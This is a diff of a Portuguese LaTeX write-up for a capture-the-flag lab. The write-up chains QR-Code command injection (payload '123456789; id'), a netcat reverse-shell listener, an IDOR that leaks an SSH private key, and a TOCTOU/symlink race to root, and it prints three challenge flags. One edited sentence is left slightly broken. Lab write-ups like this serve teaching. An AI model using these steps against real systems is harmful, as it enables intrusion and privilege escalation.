@@ -11,7 +11,7 @@
 %------------------------- Codificacao e idioma -------------------------------
 \usepackage[utf8]{inputenc}
 \usepackage[T1]{fontenc}
-\usepackage[brazil]{babel}
+\usepackage[brazilian]{babel}
 
 %------------------------- Fonte Times New Roman ------------------------------
 \usepackage{newtxtext}   % corpo em Times
@@ -175,21 +175,20 @@ enumeração revela a rota \texttt{/beta}, um módulo de \emph{Recarga de Crédi
 Carteirinha} que recebe a foto de uma carteirinha estudantil, lê o \textbf{QR
 Code} da imagem e repassa o conteúdo decodificado a um \textbf{script legado}
 executado via \emph{shell} --- sem qualquer saneamento. Isso permite
-\textbf{injeção de comando} (CVE/CWE-78) embutindo um \emph{payload} no próprio
+\textbf{injeção de comando} embutindo um \emph{payload} no próprio
 texto do QR Code, resultando em execução como \texttt{ru\_web} e numa
 \textbf{reverse shell} (flag de usuário). A \textbf{movimentação lateral} explora
 uma API administrativa interna (\texttt{/opt/admin-api}, porta 9090) que roda como
 \texttt{root} \textbf{sem autenticação}: um \textbf{IDOR} no endpoint
 \texttt{/api/v1/operadores/3} vaza a \textbf{chave privada SSH} do usuário
 \texttt{operador\_caixa}, usada para login via SSH (segunda flag). Por fim, o
-serviço de conciliação \texttt{/opt/conciliacao.py}, executado como \texttt{root},
-contém uma condição de corrida \textbf{TOCTOU} combinada a \textbf{symlink}: ele
+serviço de conciliação \texttt{/opt/conciliacao.py}, executado como \texttt{root}, ele
 checa \texttt{conciliacao.tmp} com \texttt{lstat} (sem seguir links), mas depois
 abre o mesmo caminho com \texttt{open("w")} (seguindo links), permitindo
 sobrescrever e executar o \emph{helper} \texttt{helper\_conciliacao.sh} como root.
-Fluxo: reconhecimento $\rightarrow$ QR Code RCE $\rightarrow$ \texttt{ru\_web}
-$\rightarrow$ IDOR / chave SSH $\rightarrow$ \texttt{operador\_caixa}
-$\rightarrow$ TOCTOU / symlink $\rightarrow$ \texttt{root}.
+Fluxo: reconhecimento \texorpdfstring{$\rightarrow$}{->} QR Code RCE $\rightarrow$ \texttt{ru\_web}
+\texorpdfstring{$\rightarrow$}{->} IDOR / chave SSH $\rightarrow$ \texttt{operador\_caixa}
+\texorpdfstring{$\rightarrow$}{->} TOCTOU / symlink $\rightarrow$ \texttt{root}.
 
 %============================= 2.4 RECONHECIMENTO ===============================
 \section{Reconhecimento}
@@ -201,8 +200,8 @@ nmap -T4 127.0.0.1
 
 Apenas \textbf{duas portas} abertas. O Nmap rotula os serviços por porta padrão
 (\texttt{EtherNetIP-1} e \texttt{http-alt}), mas o \texttt{docker-compose.yml} do
-desafio confirma o mapeamento real: \textbf{2222 $\rightarrow$ SSH} (22 do
-container) e \textbf{8000 $\rightarrow$ portal web Flask}.
+desafio confirma o mapeamento real: \textbf{2222 \texorpdfstring{$\rightarrow$}{->} SSH} (22 do
+container) e \textbf{8000 \texorpdfstring{$\rightarrow$}{->} portal web Flask}.
 
 \begin{lstlisting}[style=output,caption={Portas abertas identificadas.}]
 PORT     STATE SERVICE
@@ -293,11 +292,11 @@ repassado a um \textbf{script legado} executado via \emph{shell}.
 \begin{figure}[H]
   \centering
   \includegraphics[width=0.9\linewidth]{file_send.png}
-  \caption{Envio de uma carteirinha com QR Code válido pelo módulo \texttt{/beta}.}
+  \caption{Painel de envio de uma carteirinha com QR Code pelo módulo \texttt{/beta}.}
   \label{fig:file_send}
 \end{figure}
 
-\subsection{Injeção de comando via QR Code (CWE-78)}
+\subsection{Injeção de comando via QR Code}
 Como o conteúdo do QR é concatenado em uma linha de comando sem saneamento,
 embute-se um \emph{payload} que encadeia um segundo comando com \texttt{;}. Gera-se
 um QR Code (biblioteca \texttt{qrcode} do Python) contendo:
@@ -306,7 +305,7 @@ um QR Code (biblioteca \texttt{qrcode} do Python) contendo:
 123456789; id
 \end{lstlisting}
 
-\begin{lstlisting}[language=python,caption={Geração da imagem com o QR Code malicioso.}]
+\begin{lstlisting}[language=python,caption={Geração da imagem com o QR Code malicioso - script Python.}]
 import qrcode
 payload = '123456789; id'
 img = qrcode.make(payload)
@@ -350,11 +349,11 @@ nc -lvnp 4444
 A conexão retorna uma \emph{shell} interativa como \texttt{ru\_web}, e a
 \textbf{flag de usuário} está em \texttt{/home/ru\_web}.
 
-\begin{lstlisting}[language=bash,caption={Shell como ru_web e leitura da flag de usuario.}]
+\begin{lstlisting}[language=bash,caption={Shell como ru\_web e leitura da flag de usuario.}]
 cat /home/ru_web/user_ru_web.txt
 \end{lstlisting}
 
-\begin{lstlisting}[style=output,caption={Flag de usuario (ru_web).}]
+\begin{lstlisting}[style=output,caption={Flag de usuario (ru\_web).}]
 TAC{RU_qr_c0de_nao_e_so_pra_leitura_7f3a1c}
 \end{lstlisting}
 
@@ -376,7 +375,7 @@ TAC{RU_qr_c0de_nao_e_so_pra_leitura_7f3a1c}
 \end{becosemsaida}
 
 %============================= 2.6 MOV. LATERAL =================================
-\section{Movimentação Lateral (ru\_web $\rightarrow$ operador\_caixa)}
+\section{Movimentação Lateral (ru\_web \texorpdfstring{$\rightarrow$}{->} operador\_caixa)}
 
 \subsection{Enumeração de serviços internos}
 Listando os processos com \cmd{ps aux}, identificam-se três serviços
@@ -402,14 +401,14 @@ root  21  python3 -u /opt/conciliacao.py
 A leitura de \texttt{/opt/admin-api/app.py} mostra que a API (porta \textbf{9090})
 roda \textbf{sem autenticação}. O endpoint \texttt{/api/v1/operadores/<id>} aceita
 um identificador numérico e devolve os dados do operador --- inclusive sua
-\textbf{chave privada SSH}. Trata-se de um \textbf{IDOR} (CWE-639): basta iterar o
+\textbf{chave privada SSH}, basta iterar o
 \texttt{id} para acessar qualquer operador.
 
 \begin{lstlisting}[language=bash,caption={Requisicao ao endpoint interno sem autenticacao.}]
 curl -s http://127.0.0.1:9090/api/v1/operadores/3
 \end{lstlisting}
 
-\begin{lstlisting}[style=output,caption={Resposta do IDOR: chave privada de operador_caixa (truncada).}]
+\begin{lstlisting}[style=output,caption={Resposta do IDOR: chave privada de operador\_caixa (truncada).}]
 {"cargo":"Operador de Caixa (automacao)",
  "chave_privada":"-----BEGIN OPENSSH PRIVATE KEY-----\n...TRUNCADA...\n-----END OPENSSH PRIVATE KEY-----\n",
  "email":"operador_caixa@ru.unb.br","id":3,
@@ -419,7 +418,7 @@ curl -s http://127.0.0.1:9090/api/v1/operadores/3
 Grava-se a chave localmente (ajustando as quebras de linha), restringem-se as
 permissões e autentica-se via SSH na porta 2222.
 
-\begin{lstlisting}[language=bash,caption={Uso da chave vazada para login SSH como operador_caixa.}]
+\begin{lstlisting}[language=bash,caption={Uso da chave vazada para login SSH como operador\_caixa.}]
 chmod 600 id_operador
 ssh -i id_operador -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null \
     -p 2222 operador_caixa@127.0.0.1
@@ -431,7 +430,7 @@ A \textbf{flag de operador} está no \emph{home} de \texttt{operador\_caixa}.
 cat user_operador.txt
 \end{lstlisting}
 
-\begin{lstlisting}[style=output,caption={Flag de movimentacao lateral (operador_caixa).}]
+\begin{lstlisting}[style=output,caption={Flag de movimentacao lateral (operador\_caixa).}]
 TAC{RU_1d0r_ssh_operador_6b2f9a}
 \end{lstlisting}
 
@@ -453,12 +452,13 @@ TAC{RU_1d0r_ssh_operador_6b2f9a}
 \end{becosemsaida}
 
 %======================== 2.7 ESCALADA DE PRIVILEGIOS ==========================
-\section{Escalada de Privilégios (operador\_caixa $\rightarrow$ root)}
+\section{Escalada de Privilégios (operador\_caixa \texorpdfstring{$\rightarrow$}{->} root)}
 
 \subsection{Análise do job de conciliação}
 O \texttt{/opt/conciliacao.py}, executado como \texttt{root} em laço, processa um
 arquivo \texttt{conciliacao.tmp} no diretório \texttt{/var/ru/caixa} (gravável pelo
-operador). A lógica contém uma condição de corrida \textbf{TOCTOU} (CWE-367)
+operador). A lógica contém uma condição de corrida \textbf{TOCTOU}, ou seja o momento de verificação
+é distinto do momento de uso,
 agravada por \textbf{symlink}:
 
 \begin{lstlisting}[style=output,caption={Trecho vulneravel de /opt/conciliacao.py.}]
@@ -525,12 +525,12 @@ TAC{RU_t0ct0u_syml1nk_r00t_9c4e2b}
 %============================= 2.8 CONCLUSAO ====================================
 \section{Conclusão}
 O comprometimento encadeou quatro falhas distintas. O acesso inicial veio de uma
-\textbf{injeção de comando} (CWE-78): o conteúdo do QR Code da carteirinha era
+\textbf{injeção de comando}: o conteúdo do QR Code da carteirinha era
 repassado a um \emph{script legado} sem saneamento, permitindo execução como
 \texttt{ru\_web} e \emph{reverse shell}. A \textbf{movimentação lateral} explorou
-uma \textbf{API interna sem autenticação} com \textbf{IDOR} (CWE-639), que vazou a
+uma \textbf{API interna sem autenticação}, que vazou a
 \textbf{chave privada SSH} de \texttt{operador\_caixa}. A \textbf{escalada a root}
-abusou de uma condição de corrida \textbf{TOCTOU} (CWE-367) combinada a
+abusou de uma condição de corrida \textbf{TOCTOU} combinada a
 \textbf{symlink} no \emph{job} de conciliação executado como \texttt{root},
 sobrescrevendo um \emph{helper} e obtendo um \texttt{bash} com SUID. As falhas
 centrais foram: \textbf{entrada não saneada} enviada ao \emph{shell}, \textbf{falta
